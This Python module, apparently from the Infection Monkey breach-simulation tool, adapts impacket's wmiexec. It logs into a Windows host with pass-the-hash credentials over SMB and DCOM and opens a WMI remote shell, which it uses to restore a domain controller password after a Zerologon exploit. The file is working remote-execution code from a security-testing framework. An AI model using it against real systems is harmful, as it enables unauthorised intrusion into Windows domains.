import logging
import time

from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import SMBConnection

from infection_monkey.exploit.zerologon_utils.remote_shell import RemoteShell

LOG = logging.getLogger(__name__)


# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
# Used to get HKLM keys for restoring original DC password
class Wmiexec:
    OUTPUT_FILENAME = '__' + str(time.time())

    def __init__(self, ip, username, hashes, password='', domain='', share='ADMIN$'):
        self.__ip = ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash, self.__nthash = hashes.split(':')
        self.__share = share
        self.shell = None

    def connect(self):
        self.smbConnection = SMBConnection(self.__ip, self.__ip)
        self.smbConnection.login(user=self.__username,
                                 password=self.__password,
                                 domain=self.__domain,
                                 lmhash=self.__lmhash,
                                 nthash=self.__nthash)

        self.dcom = DCOMConnection(target=self.__ip,
                                   username=self.__username,
                                   password=self.__password,
                                   domain=self.__domain,
                                   lmhash=self.__lmhash,
                                   nthash=self.__nthash,
                                   oxidResolver=True)

        try:
            iInterface = self.dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            self.iWbemServices = iWbemLevel1Login.NTLMLogin(
                '//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

        except (Exception, KeyboardInterrupt) as e:
            LOG.error(str(e))
            self.smbConnection.logoff()
            self.dcom.disconnect()

    def get_remote_shell(self):
        self.connect()
        win32Process, _ = self.iWbemServices.GetObject('Win32_Process')
        self.shell = RemoteShell(
            self.__share, win32Process, self.smbConnection, self.OUTPUT_FILENAME)
        return self.shell

    def close(self):
        self.smbConnection.close()
        self.smbConnection = None
        self.dcom.disconnect()
        self.dcom = None
